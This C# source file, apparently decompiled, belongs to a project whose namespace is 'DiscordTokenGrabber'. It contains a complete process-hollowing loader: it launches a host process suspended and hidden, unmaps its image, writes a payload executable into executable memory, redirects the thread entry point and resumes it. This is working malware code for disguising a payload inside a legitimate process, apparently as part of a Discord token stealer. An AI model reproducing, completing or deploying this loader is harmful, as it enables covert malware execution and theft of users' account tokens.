using System;
using System.IO;
using System.Runtime.InteropServices;

namespace DiscordTokenGrabber;

public static class PE
{
	[StructLayout(LayoutKind.Explicit, Size = 104)]
	public struct StartupInfo
	{
		[FieldOffset(0)]
		public uint cb;

		[FieldOffset(60)]
		public uint dwFlags;

		[FieldOffset(64)]
		public ushort wShowWindow;
	}

	[DllImport("kernel32.dll")]
	private unsafe static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, StartupInfo* lpStartupInfo, byte[] lpProcessInfo);

	[DllImport("kernel32.dll")]
	private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, long written);

	[DllImport("ntdll.dll")]
	private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

	[DllImport("kernel32.dll")]
	private static extern uint ResumeThread(long hThread);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(long handle);

	public unsafe static void Load(byte[] payloadBuffer, string host, string args)
	{
		int num = Marshal.ReadInt32(payloadBuffer, 60);
		int num2 = Marshal.ReadInt32(payloadBuffer, num + 24 + 56);
		int nSize = Marshal.ReadInt32(payloadBuffer, num + 24 + 60);
		int num3 = Marshal.ReadInt32(payloadBuffer, num + 24 + 16);
		short num4 = Marshal.ReadInt16(payloadBuffer, num + 4 + 2);
		short num5 = Marshal.ReadInt16(payloadBuffer, num + 4 + 16);
		long num6 = Marshal.ReadInt64(payloadBuffer, num + 24 + 24);
		StartupInfo structure = default(StartupInfo);
		structure.cb = (uint)Marshal.SizeOf(structure);
		structure.wShowWindow = 0;
		structure.dwFlags = 1u;
		byte[] array = new byte[24];
		IntPtr intPtr = Allocate(1232, 16);
		string text = host;
		if (!string.IsNullOrEmpty(args))
		{
			text = text + " " + args;
		}
		string currentDirectory = Directory.GetCurrentDirectory();
		Marshal.WriteInt32(intPtr, 48, 1048603);
		CreateProcess(null, text, IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 4u, IntPtr.Zero, currentDirectory, &structure, array);
		long num7 = Marshal.ReadInt64(array, 0);
		long num8 = Marshal.ReadInt64(array, 8);
		ZwUnmapViewOfSection(num7, num6);
		VirtualAllocEx(num7, num6, num2, 12288u, 64u);
		WriteProcessMemory(num7, num6, payloadBuffer, nSize, 0L);
		for (short num9 = 0; num9 < num4; num9 = (short)(num9 + 1))
		{
			byte[] array2 = new byte[40];
			Buffer.BlockCopy(payloadBuffer, num + (24 + num5) + 40 * num9, array2, 0, 40);
			int num10 = Marshal.ReadInt32(array2, 12);
			int num11 = Marshal.ReadInt32(array2, 16);
			int srcOffset = Marshal.ReadInt32(array2, 20);
			byte[] array3 = new byte[num11];
			Buffer.BlockCopy(payloadBuffer, srcOffset, array3, 0, array3.Length);
			WriteProcessMemory(num7, num6 + num10, array3, array3.Length, 0L);
		}
		GetThreadContext(num8, intPtr);
		byte[] bytes = BitConverter.GetBytes(num6);
		long num12 = Marshal.ReadInt64(intPtr, 136);
		WriteProcessMemory(num7, num12 + 16L, bytes, 8, 0L);
		Marshal.WriteInt64(intPtr, 128, num6 + num3);
		SetThreadContext(num8, intPtr);
		ResumeThread(num8);
		Marshal.FreeHGlobal(intPtr);
		CloseHandle(num7);
		CloseHandle(num8);
	}

	private static IntPtr Align(IntPtr source, int alignment)
	{
		long num = source.ToInt64() + (alignment - 1);
		long value = alignment * (num / alignment);
		return new IntPtr(value);
	}

	private static IntPtr Allocate(int size, int alignment)
	{
		IntPtr source = Marshal.AllocHGlobal(size + alignment / 2);
		return Align(source, alignment);
	}
}
